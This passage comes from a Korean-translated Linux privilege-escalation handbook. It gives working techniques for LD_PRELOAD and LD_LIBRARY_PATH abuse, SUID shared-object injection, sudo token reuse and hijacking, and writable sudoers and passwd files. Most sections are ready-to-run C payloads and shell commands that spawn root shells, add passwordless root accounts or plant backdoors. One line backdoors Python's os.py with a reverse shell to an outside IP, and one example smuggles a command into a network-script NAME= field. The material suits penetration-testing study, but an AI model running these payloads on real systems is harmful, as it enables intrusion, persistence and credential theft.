`sudo`로 commands를 실행할 수 있고 `sudo -l`의 output에 **env_keep+=LD_PRELOAD** 문구가 포함되어 있다면 privilege escalation이 발생할 수 있습니다. 이 설정은 **LD_PRELOAD** 환경 변수가 유지되고 `sudo`로 commands를 실행할 때도 인식되도록 하여, 잠재적으로 elevated privileges로 임의 code가 실행되게 만들 수 있습니다.
```
Defaults        env_keep += LD_PRELOAD
```
/tmp/pe.c
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
그런 다음 **다음으로 컴파일**하세요:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
마지막으로, **privileges를 escalate**하여 실행합니다
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 공격자가 **LD_LIBRARY_PATH** 환경 변수를 제어할 수 있다면, 라이브러리를 검색할 경로를 제어하므로 유사한 privesc가 악용될 수 있다.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

**SUID** 권한이 있는 바이너리를 만나서 이상해 보인다면, **.so** 파일을 제대로 로드하는지 확인하는 것이 좋습니다. 다음 명령을 실행하여 이를 확인할 수 있습니다:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
예를 들어, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 같은 오류를 마주했다면, 악용 가능성이 있음을 시사합니다.

이를 악용하려면, _"/path/to/.config/libcalc.c"_ 같은 C 파일을 만들고, 다음 코드를 넣으면 됩니다:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
이 코드는 컴파일되고 실행되면 파일 권한을 조작하고 상승된 권한으로 셸을 실행하여 권한을 상승시키는 것을 목표로 합니다.

위의 C 파일을 다음과 같이 shared object (.so) 파일로 컴파일하세요:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
마지막으로, 영향을 받는 SUID binary를 실행하면 exploit이 트리거되어 시스템 compromise로 이어질 수 있습니다.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
이제 우리가 쓸 수 있는 폴더에서 라이브러리를 로드하는 SUID binary를 찾았으니, 그 폴더에 필요한 이름으로 라이브러리를 생성해봅시다:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
If you get an error such as
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io)은 공격자가 로컬 보안 제한을 우회하기 위해 악용할 수 있는 Unix binaries의 큐레이션된 목록입니다. [**GTFOArgs**](https://gtfoargs.github.io/)는 명령에서 **인자만 주입할 수 있는** 경우를 위한 동일한 것입니다.

이 프로젝트는 제한된 shells에서 벗어나고, 권한을 상승하거나 유지하고, 파일을 전송하고, bind 및 reverse shells를 생성하고, 다른 post-exploitation 작업을 수행하는 데 악용될 수 있는 Unix binaries의 합법적인 기능을 수집합니다.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l`에 접근할 수 있다면, 도구 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo)를 사용해 어떤 sudo rule도 악용할 수 있는 방법이 있는지 확인할 수 있습니다.

### Reusing Sudo Tokens

**sudo access**는 있지만 비밀번호가 없는 경우, **sudo command 실행을 기다렸다가 session token을 하이재킹**하여 권한을 상승할 수 있습니다.

권한 상승 요구사항:

- 이미 "_sampleuser_" 사용자로 shell이 있어야 함
- "_sampleuser_"가 지난 **15분** 이내에 **sudo**를 사용해 무언가를 실행했어야 함(기본적으로 이것이 비밀번호 없이 `sudo`를 사용할 수 있게 해주는 sudo token의 지속 시간입니다)
- `cat /proc/sys/kernel/yama/ptrace_scope`가 0이어야 함
- `gdb`에 접근 가능해야 함(업로드할 수 있어야 함)

(`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`로 일시적으로 `ptrace_scope`를 활성화하거나, `/etc/sysctl.d/10-ptrace.conf`를 영구적으로 수정하고 `kernel.yama.ptrace_scope = 0`로 설정할 수 있습니다)

이 모든 요구사항이 충족되면, 다음을 사용해 권한을 상승할 수 있습니다: [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **첫 번째 exploit** (`exploit.sh`)은 _/tmp_에 바이너리 `activate_sudo_token`을 생성합니다. 이를 사용해 **세션에서 sudo token을 활성화**할 수 있습니다(자동으로 root shell을 얻지는 못합니다. `sudo su`를 실행하세요):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **두 번째 exploit** (`exploit_v2.sh`)은 _/tmp_에 **root 소유의 setuid가 설정된 sh shell**을 생성합니다
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **세 번째 exploit** (`exploit_v3.sh`)은 **sudoers 파일을 생성**하여 **sudo 토큰을 영구적으로 만들고 모든 사용자가 sudo를 사용할 수 있게 합니다**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

폴더 또는 그 안에 생성된 파일들에 대해 **write permissions**가 있다면, binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)을 사용해 **특정 user와 PID에 대한 sudo token**을 만들 수 있습니다.\
예를 들어, _/var/run/sudo/ts/sampleuser_ 파일을 덮어쓸 수 있고, PID 1234로 해당 user의 shell을 가지고 있다면, 비밀번호를 알 필요 없이 **sudo privileges**를 획득할 수 있습니다:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

파일 `/etc/sudoers`와 `/etc/sudoers.d` 안의 파일들은 누가 `sudo`를 사용할 수 있는지, 그리고 어떻게 사용할 수 있는지 설정한다. 이 파일들은 **기본적으로 user root와 group root만 읽을 수 있다**.\
**만약** 이 파일을 **읽을 수 있다면** **흥미로운 정보**를 얻을 수 있고, 어떤 파일이든 **쓸 수 있다면** **권한 상승**을 할 수 있다.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
글을 쓸 수 있다면 이 권한을 악용할 수 있다
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
이 권한들을 악용하는 또 다른 방법:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` 바이너리의 대안으로 OpenBSD용 `doas`가 있습니다. `/etc/doas.conf`에서 설정을 확인하는 것을 잊지 마세요.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

만약 **사용자가 보통 machine에 접속해서 `sudo`를 사용해** privilege escalation을 한다는 것을 알고 있고, 당신이 그 **user context** 안에서 shell을 얻었다면, **새로운 sudo executable**을 만들어서 먼저 당신의 code를 root 권한으로 실행한 뒤 그 다음 사용자의 command를 실행하게 할 수 있습니다. 그런 다음 user context의 **$PATH**를 modify하면(예: `.bash_profile`에 새 path를 추가), 사용자가 `sudo`를 실행할 때 당신의 sudo executable이 실행됩니다.

사용자가 다른 shell을 사용한다면(bash가 아니라면) 새 path를 추가하기 위해 다른 files를 modify해야 합니다. 예를 들어 [sudo-piggyback](https://github.com/APTy/sudo-piggyback)는 `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`을 modify합니다. 다른 예시는 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)에서 찾을 수 있습니다.

또는 다음과 같이 실행할 수도 있습니다:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

파일 `/etc/ld.so.conf`는 **로드된 설정 파일들이 어디에서 오는지**를 나타냅니다. 일반적으로 이 파일에는 다음 경로가 포함됩니다: `include /etc/ld.so.conf.d/*.conf`

즉, `/etc/ld.so.conf.d/*.conf`의 설정 파일들이 읽히게 됩니다. 이 설정 파일들은 **라이브러리**가 **검색될** 다른 폴더들을 **가리킵니다**. 예를 들어, `/etc/ld.so.conf.d/libc.conf`의 내용은 `/usr/local/lib`입니다. **이는 시스템이 `/usr/local/lib` 안에서 라이브러리를 검색한다는 뜻입니다**.

어떤 이유로든 **사용자가** 다음 경로들 중 하나에 쓰기 권한을 가지고 있다면: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` 안의 어떤 파일, 또는 `/etc/ld.so.conf.d/*.conf` 안의 설정 파일이 가리키는 어떤 폴더든, 권한 상승이 가능할 수 있습니다.\
다음 페이지에서 **이 잘못된 설정을 어떻게 악용하는지** 확인해보세요:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`lib`를 `/var/tmp/flag15/`로 복사하면, `RPATH` 변수에 지정된 대로 이 위치에서 프로그램이 이를 사용하게 됩니다.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Then create an evil library in `/var/tmp` with `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities는 프로세스에 root privileges의 **사용 가능한 일부를 제공**합니다. 이는 사실상 root **privileges를 더 작고 구분된 단위로 나누는 것**입니다. 각 단위는 이후 프로세스에 독립적으로 부여할 수 있습니다. 이렇게 하면 전체 privileges 집합이 줄어들어 exploitation 위험이 감소합니다.\
capabilities에 대해 **더 알아보고 이를 어떻게 abuse하는지** 보려면 다음 페이지를 읽으세요:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

디렉터리에서 **"execute" 비트**는 영향을 받는 사용자가 폴더 안으로 "**cd**" 할 수 있음을 의미합니다.\
**"read" 비트**는 사용자가 **files를 목록으로 볼 수 있음**을 의미하고, **"write" 비트**는 사용자가 새로운 **files를 삭제**하고 **생성**할 수 있음을 의미합니다.

## ACLs

Access Control Lists (ACLs)는 기존 ugo/rwx permissions를 **재정의할 수 있는 보조적인 discretionary permissions 계층**을 나타냅니다. 이 permissions는 소유자나 group의 일부가 아닌 특정 사용자에게 권한을 허용하거나 거부함으로써 file 또는 directory access 제어를 강화합니다. 이러한 수준의 **granularity는 더 정밀한 access management를 보장**합니다. 자세한 내용은 [**여기**](https://linuxconfig.org/how-to-manage-acls-on-linux)에서 확인할 수 있습니다.

"user" "kali"에게 file에 대한 read 및 write permissions를 **부여**하세요:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**시스템에서 특정 ACL을 가진** 파일 가져오기:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-ins의 Hidden ACL backdoor

흔한 잘못된 설정은 `/etc/sudoers.d/`에 있는 root 소유 파일이 mode `440`인데도, ACL을 통해 low-priv user에게 write access를 여전히 부여하는 것입니다.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
`user:alice:rw-`와 같은 것을 보면, 사용자는 제한적인 mode bits에도 불구하고 sudo rule을 추가할 수 있습니다:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
이것은 `ls -l`만 보는 리뷰에서는 놓치기 쉬운, 영향도가 높은 ACL 지속성/privesc 경로입니다.

## Open shell sessions

**old versions**에서는 다른 사용자(**root**)의 일부 **shell** 세션을 **hijack**할 수 있습니다.\
가장 **newest versions**에서는 **자신의 사용자**의 screen 세션에만 **connect**할 수 있습니다. 그러나 세션 안에서 **interesting information**을 찾을 수 있습니다.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**세션에 연결하기**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

이것은 **old tmux versions**에서의 문제였다. 나는 non-privileged user로서 root가 생성한 tmux (v2.1) session을 hijack할 수 없었다.

**List tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**세션에 연결하기**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Debian 기반 시스템(Ubuntu, Kubuntu, etc)에서 2006년 9월부터 2008년 5월 13일 사이에 생성된 모든 SSL 및 SSH key는 이 bug의 영향을 받을 수 있습니다.\
이 bug는 해당 OS에서 새 ssh key를 생성할 때 발생하며, **가능한 변형이 32,768개뿐**이었기 때문입니다. 즉, 모든 경우의 수를 계산할 수 있고 **ssh public key가 있으면 대응하는 private key를 찾을 수 있습니다**. 계산된 가능한 값들은 여기에서 확인할 수 있습니다: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** password authentication이 허용되는지 지정합니다. 기본값은 `no`입니다.
- **PubkeyAuthentication:** public key authentication이 허용되는지 지정합니다. 기본값은 `yes`입니다.
- **PermitEmptyPasswords**: password authentication이 허용될 때, 서버가 empty password strings를 가진 계정의 로그인을 허용하는지 지정합니다. 기본값은 `no`입니다.

### Login control files

이 파일들은 누가 로그인할 수 있는지와 방법에 영향을 줍니다:

- **`/etc/nologin`**: 존재하면 non-root 로그인을 차단하고 그 메시지를 출력합니다.
- **`/etc/securetty`**: root가 로그인할 수 있는 위치를 제한합니다(TTY allowlist).
- **`/etc/motd`**: 로그인 후 배너입니다(환경 또는 유지보수 세부정보를 leak할 수 있음).

### PermitRootLogin

root가 ssh를 통해 로그인할 수 있는지 지정하며, 기본값은 `no`입니다. 가능한 값은:

- `yes`: root가 password와 private key로 로그인 가능
- `without-password` or `prohibit-password`: root가 private key로만 로그인 가능
- `forced-commands-only`: root가 private key로만 로그인 가능하며 commands options가 지정된 경우에만 가능
- `no` : no

### AuthorizedKeysFile

사용자 인증에 사용할 수 있는 public keys가 들어있는 files를 지정합니다. `%h` 같은 tokens를 포함할 수 있으며, 이는 home directory로 대체됩니다. **절대 경로**(`/`로 시작) 또는 **사용자 home 기준의 relative paths**를 지정할 수 있습니다. 예를 들어:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
그 설정은 **"testusername"** 사용자 의 **private** key로 로그인하려고 하면 ssh가 당신의 key의 public key를 `/home/testusername/.ssh/authorized_keys` 및 `/home/testusername/access`에 위치한 것들과 비교한다는 것을 나타낸다.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding을 사용하면 서버에 keys를 그대로 두지 않고(**passphrases** 없이!) **로컬 SSH keys를 사용**할 수 있다. 따라서 ssh를 통해 **한 호스트로 이동**한 다음, 거기서 **초기 호스트**에 있는 **key**를 **사용하여** 다른 호스트로 **이동**할 수 있다.

이 옵션은 `$HOME/.ssh.config`에 다음과 같이 설정해야 한다:
```
Host example.com
ForwardAgent yes
```
`Host`가 `*`이면 사용자가 다른 머신으로 이동할 때마다 그 host가 키에 접근할 수 있다는 점에 유의하세요(이는 보안 문제입니다).

파일 `/etc/ssh_config`는 이 **options**를 **override**하여 이 구성을 허용하거나 거부할 수 있습니다.\
파일 `/etc/sshd_config`는 `AllowAgentForwarding` 키워드로 ssh-agent forwarding을 **allow**하거나 **denied**할 수 있습니다(기본값은 allow).

환경에서 Forward Agent가 구성되어 있음을 발견하면, 이를 **권한 상승에 악용할 수 있으므로** 다음 페이지를 읽어보세요:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

파일 `/etc/profile`와 `/etc/profile.d/` 아래의 파일들은 **사용자가 새 shell을 실행할 때 실행되는 scripts**입니다. 따라서 이들 중 **하나라도 write하거나 modify할 수 있다면 권한 상승이 가능합니다**.
```bash
ls -l /etc/profile /etc/profile.d/
```
If any weird profile script is found you should check it for **민감한 정보**.

### Passwd/Shadow Files

OS에 따라 `/etc/passwd`와 `/etc/shadow` 파일이 다른 이름을 사용하거나 백업본이 있을 수 있습니다. 따라서 **모두 찾아서** **읽을 수 있는지 확인**하고, 파일 안에 **hashes**가 있는지 확인하는 것이 좋습니다:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
어떤 경우에는 `/etc/passwd`(또는 이에 상응하는) 파일 안에서 **password hashes**를 찾을 수 있습니다
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

먼저, 다음 명령 중 하나를 사용하여 password를 생성하세요.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
사용자 `hacker`를 추가하고 생성된 비밀번호를 추가합니다.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
예: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

이제 `su` 명령을 `hacker:hacker`로 사용할 수 있습니다.

또는, 다음 줄을 사용해 비밀번호 없는 더미 사용자를 추가할 수 있습니다.\
경고: 현재 시스템의 보안을 저하시킬 수 있습니다.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
참고: BSD 플랫폼에서는 `/etc/passwd`가 `/etc/pwd.db`와 `/etc/master.passwd`에 위치하고, `/etc/shadow`는 `/etc/spwd.db`로 이름이 바뀝니다.

일부 민감한 파일에 **쓰기**가 가능한지 확인해야 합니다. 예를 들어, 어떤 **서비스 설정 파일**에 쓸 수 있는지 확인해 보세요.
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
예를 들어, 머신이 **tomcat** 서버를 실행 중이고 **/etc/systemd/ 내부의 Tomcat service configuration file을 수정할 수 있다면,** 다음 줄들을 수정할 수 있습니다:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
당신의 backdoor는 다음에 tomcat이 시작될 때 실행될 것입니다.

### Check Folders

다음 폴더에는 백업이나 흥미로운 정보가 있을 수 있습니다: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (아마 마지막 것은 읽을 수 없겠지만 시도해 보세요)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 이상한 위치/소유된 파일
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 지난 몇 분 동안 수정된 파일
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 파일
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 파일들
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 숨겨진 파일
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH에 있는 Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **웹 파일**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **백업**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 비밀번호가 포함된 것으로 알려진 파일

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)의 코드를 읽어보면, **비밀번호를 포함할 수 있는 여러 가능한 파일**을 검색합니다.\
**또 다른 흥미로운 도구**로는 [**LaZagne**](https://github.com/AlessandroZ/LaZagne)이 있는데, 이것은 Windows, Linux & Mac에서 로컬 컴퓨터에 저장된 많은 비밀번호를 가져오는 데 사용되는 오픈 소스 애플리케이션입니다.

### Logs

로그를 읽을 수 있다면, 그 안에서 **흥미롭거나/기밀성 있는 정보**를 찾을 수 있을지도 모릅니다. 이상한 로그일수록 더 흥미로울 가능성이 큽니다(아마도).\
또한, 일부 "**bad**"하게 설정된(백도어가 있는?) **audit logs**는 이 게시물에서 설명하듯이 audit logs 안에 **비밀번호를 기록**할 수 있게 해줄 수 있습니다: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
로그를 **읽으려면**, [**adm**](interesting-groups-linux-pe/index.html#adm-group) 그룹이 매우 유용합니다.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

또한 **이름**에 "**password**"라는 단어가 포함된 파일이나 **content** 안에 포함된 파일을 확인해야 하고, logs 안의 IPs와 emails, 또는 hashes regexps도 확인해야 합니다.\
이 모든 것을 어떻게 하는지 여기서는 모두 나열하지 않겠지만, 관심이 있다면 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)가 수행하는 마지막 checks를 확인할 수 있습니다.

## Writable files

### Python library hijacking

어느 **from where** python script가 실행될지 알고 있고, 해당 folder 안에 **write**할 수 있거나 **modify python libraries**할 수 있다면, OS library를 modify해서 backdoor할 수 있습니다. (python script가 실행될 위치에 write할 수 있다면 os.py library를 copy and paste 하세요).

library를 **backdoor**하려면 os.py library 끝에 다음 줄을 추가하세요 (IP와 PORT를 변경):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate`의 취약점은 로그 파일 또는 그 상위 디렉터리에 대해 **write permissions**가 있는 사용자가 권한 상승을 얻을 수 있게 할 수 있습니다. 이는 주로 **root**로 실행되는 `logrotate`가 임의의 파일을 실행하도록 조작될 수 있기 때문이며, 특히 _**/etc/bash_completion.d/**_ 같은 디렉터리에서 문제가 됩니다. _/var/log_뿐만 아니라 log rotation이 적용되는 모든 디렉터리의 권한을 확인하는 것이 중요합니다.

> [!TIP]
> 이 취약점은 `logrotate` 버전 `3.18.0` 및 그 이전 버전에 영향을 줍니다

취약점에 대한 더 자세한 정보는 이 페이지에서 확인할 수 있습니다: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

이 취약점은 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),**와 매우 유사하므로, 로그를 변경할 수 있음을 발견할 때마다 누가 그 로그를 관리하는지 확인하고, symlinks로 로그를 대체하여 권한 상승이 가능한지 확인하세요.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

어떤 이유로든 사용자가 _/etc/sysconfig/network-scripts_에 `ifcf-<whatever>` 스크립트를 **write**할 수 있거나, 기존 스크립트를 **adjust**할 수 있다면, **system is pwned**입니다.

예를 들어 _ifcg-eth0_ 같은 네트워크 스크립트는 네트워크 연결에 사용됩니다. 이것들은 .INI 파일과 정확히 똑같아 보입니다. 하지만 Linux에서는 Network Manager (dispatcher.d)에 의해 \~sourced\~ 됩니다.

제 경우, 이 네트워크 스크립트의 `NAME=` 속성이 올바르게 처리되지 않습니다. 이름에 **white/blank space**가 있으면 시스템은 white/blank space 뒤의 부분을 실행하려고 시도합니다. 즉, **첫 번째 blank space 뒤의 모든 내용이 root로 실행됩니다**.

예를 들어: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Note the blank space between Network and /bin/id_)

### **init, init.d, systemd, and rc.d**

